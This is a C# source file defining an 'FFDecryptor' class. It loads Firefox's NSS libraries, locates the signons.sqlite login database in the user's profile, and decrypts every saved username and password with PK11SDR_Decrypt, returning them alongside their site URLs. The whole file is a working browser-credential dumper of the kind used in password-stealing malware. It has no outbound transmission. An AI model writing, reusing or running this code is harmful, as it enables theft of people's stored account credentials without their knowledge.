using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Data;
using System.Data.SQLite;
using System.Text;
using System.Data.Common;
using System.Collections.Generic;
using System.Security.Cryptography;

class FFDecryptor
{
    public class SHITEMID
    {
        public long cb;
        public byte[] abID;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct TSECItem
    {
        public int SECItemType;
        public int SECItemData;
        public int SECItemLen;
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string dllFilePath);
    IntPtr NSS3;
    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate(string configdir);
    public long NSS_Init(string configdir)
    {
        string MozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\";
        LoadLibrary(MozillaPath + "mozcrt19.dll");
        LoadLibrary(MozillaPath + "nspr4.dll");
        LoadLibrary(MozillaPath + "plc4.dll");
        LoadLibrary(MozillaPath + "plds4.dll");
        LoadLibrary(MozillaPath + "ssutil3.dll");
        LoadLibrary(MozillaPath + "sqlite3.dll");
        LoadLibrary(MozillaPath + "nssutil3.dll");
        LoadLibrary(MozillaPath + "softokn3.dll");
        NSS3 = LoadLibrary(MozillaPath + "nss3.dll");
        IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
        DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
        return dll(configdir);
    }
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate2();
    public long PK11_GetInternalKeySlot()
    {
        IntPtr pProc = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
        DLLFunctionDelegate2 dll = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate2));
        return dll();
    }
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);
    public long PK11_Authenticate(long slot, bool loadCerts, long wincx)
    {
        IntPtr pProc = GetProcAddress(NSS3, "PK11_Authenticate");
        DLLFunctionDelegate3 dll = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate3));
        return dll(slot, loadCerts, wincx);
    }
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
    public int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
    {
        IntPtr pProc = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
        DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate4));
        return dll(arenaOpt, outItemOpt, inStr, inLen);
    }
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
    public int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
    {
        IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
        DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
        return dll(ref data, ref result, cx);
    }

    public string signon;
    public List<string[]> GetFirefoxPass(string masterPass = "")
    {
        List<string[]> entries = new List<string[]>();
        bool FoundFile = false;
        long KeySlot = 0;
        string MozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\";
        string DefaultPath = Environment.GetEnvironmentVariable("APPDATA") + @"\Mozilla\Firefox\Profiles";
        string[] Dirs = Directory.GetDirectories(DefaultPath);
        foreach (string dir in Dirs)
        {
            if (!FoundFile)
            {
                string[] Files = Directory.GetFiles(dir);
                foreach (string CurrFile in Files)
                {
                    if (!FoundFile)
                    {
                        if (System.Text.RegularExpressions.Regex.IsMatch(CurrFile, "signons.sqlite"))
                        {
                            NSS_Init(dir);
                            signon = CurrFile;
                        }
                    }

                    else
                    {
                        break;
                    }
                }
            }
            else
            {
                break;
            }
        }

        string dataSource = signon;
        TSECItem tSecDec = new TSECItem();
        TSECItem tSecDec2 = new TSECItem();
        byte[] bvRet;

        string firefoxCookiePath = GetFirefoxPasswordsPath();

        DataTable table = GetSQLiteData("SELECT * FROM moz_logins", firefoxCookiePath);
        KeySlot = PK11_GetInternalKeySlot();
        PK11_Authenticate(KeySlot, true, 0);
        foreach (System.Data.DataRow row in table.Rows)
        {
            string[] entry = new string[3];
            string formurl = System.Convert.ToString(row["formSubmitURL"].ToString());
            entry[0] = formurl;
            StringBuilder se = new StringBuilder(row["encryptedUsername"].ToString());
            int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length);
            TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
            if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    entry[1] = System.Text.Encoding.ASCII.GetString(bvRet);
                }
            }
            StringBuilder se2 = new StringBuilder(row["encryptedPassword"].ToString());
            int hi22 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length);
            TSECItem item2 = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi22), typeof(TSECItem));
            if (PK11SDR_Decrypt(ref item2, ref tSecDec2, 0) == 0)
            {
                if (tSecDec2.SECItemLen != 0)
                {
                    bvRet = new byte[tSecDec2.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec2.SECItemData), bvRet, 0, tSecDec2.SECItemLen);
                    entry[2] = System.Text.Encoding.ASCII.GetString(bvRet);
                }
            }
            entries.Add(entry);
        }
        return entries;
    }

    private string ByteToString(byte[] buff)
    {
        string sbinary = "";
        for (int i = 0; i < buff.Length; i++)
            sbinary += buff[i].ToString("X2");
        return (sbinary);
    }

    private string HMAC_SHA1(string key, string message)
    {
        System.Text.ASCIIEncoding encoding = new System.Text.ASCIIEncoding();
        byte[] keyByte = encoding.GetBytes(key);
        HMACMD5 hmacmd5 = new HMACMD5(keyByte);
        HMACSHA1 hmacsha1 = new HMACSHA1(keyByte);
        byte[] messageBytes = encoding.GetBytes(message);
        byte[] hashmessage = hmacsha1.ComputeHash(messageBytes);
        return ByteToString(hashmessage);
    }
 

    private DataTable GetSQLiteData(string sql,string path)
    {
        try
        {
            using (SQLiteConnection connection = new SQLiteConnection("Data Source=" + @path))
            {
                using (SQLiteCommand command = connection.CreateCommand())
                {
                    command.CommandText = sql;
                    connection.Open();
                    SQLiteDataAdapter sqLiteDataAdapter = new SQLiteDataAdapter(sql, connection);
                    DataSet dataSet = new DataSet();
                    ((DataAdapter)sqLiteDataAdapter).Fill(dataSet);
                    DataTable table = dataSet.Tables[0];
                    connection.Close();
                    return table;
                }
            }
        }
        catch (Exception ex)
        { return null; }
    }

    private string GetFirefoxPasswordsPath()
    {
        string path1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
        string path2;
        try
        {
            DirectoryInfo[] directories = new DirectoryInfo(path1).GetDirectories("*.default");
            if (directories.Length != 1)
                return string.Empty;
            path2 = path1 + directories[0].Name + "\\signons.sqlite";
        }
        catch (Exception ex)
        {
            return string.Empty;
        }
        if (!System.IO.File.Exists(path2))
            return string.Empty;
        else
            return path2;
    }



}